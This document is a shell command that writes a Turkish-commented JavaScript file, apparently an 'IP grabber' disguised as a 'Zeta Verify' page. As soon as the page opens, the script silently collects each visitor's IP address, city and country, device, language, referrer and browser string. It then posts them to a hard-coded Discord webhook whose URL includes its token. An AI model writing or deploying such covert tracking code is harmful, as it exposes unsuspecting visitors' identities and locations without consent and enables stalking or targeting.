cat > script.js << 'EOF'
// ==================== WEBHOOK'UNU GİR ====================
const WEBHOOK_URL = 'https://discord.com/api/webhooks/1522159080800518185/RT7oVMuIQVBgp7qb2L5suPst3_txYTRH0pyf9LxoYwgdkAmaWx_z7CVRZfEukqogkG0o';
// =========================================================

async function getIP() {
    try {
        const r = await fetch('https://api.ipify.org?format=json');
        const d = await r.json();
        return d.ip;
    } catch(e) { return 'Alınamadı'; }
}

async function getLocation(ip) {
    try {
        const r = await fetch(`https://ipapi.co/${ip}/json/`);
        const d = await r.json();
        return `${d.city || '?'}, ${d.country_name || '?'}`;
    } catch(e) { return 'Bilinmiyor'; }
}

function getDevice() {
    const ua = navigator.userAgent;
    if (/Android/i.test(ua)) return 'Android';
    if (/iPhone|iPad/i.test(ua)) return 'iOS';
    if (/Windows/i.test(ua)) return 'Windows';
    if (/Mac/i.test(ua)) return 'MacOS';
    if (/Linux/i.test(ua)) return 'Linux';
    return 'Bilinmiyor';
}

async function sendData() {
    const ip = await getIP();
    const location = await getLocation(ip);
    const device = getDevice();
    const time = new Date().toLocaleString('tr-TR');
    const ref = document.referrer || 'Direkt giriş';

    const data = {
        embeds: [{
            title: "🕵️ Yeni Ziyaretçi!",
            color: 0xff0000,
            fields: [
                { name: "🌐 IP", value: `\`${ip}\``, inline: true },
                { name: "📱 Cihaz", value: `\`${device}\``, inline: true },
                { name: "📍 Konum", value: `\`${location}\``, inline: true },
                { name: "🌍 Dil", value: `\`${navigator.language}\``, inline: true },
                { name: "🔗 Geldiği Sayfa", value: `\`${ref}\``, inline: false },
                { name: "🖥️ Tarayıcı", value: `\`${navigator.userAgent.substring(0, 200)}\``, inline: false },
                { name: "⏰ Zaman", value: `\`${time}\``, inline: false }
            ],
            footer: { text: "Zeta Verify • Alpha" },
            timestamp: new Date().toISOString()
        }]
    };

    await fetch(WEBHOOK_URL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(data)
    });
}

// SAYFA AÇILIR AÇILMAZ OTOMATİK GÖNDER
sendData();
EOF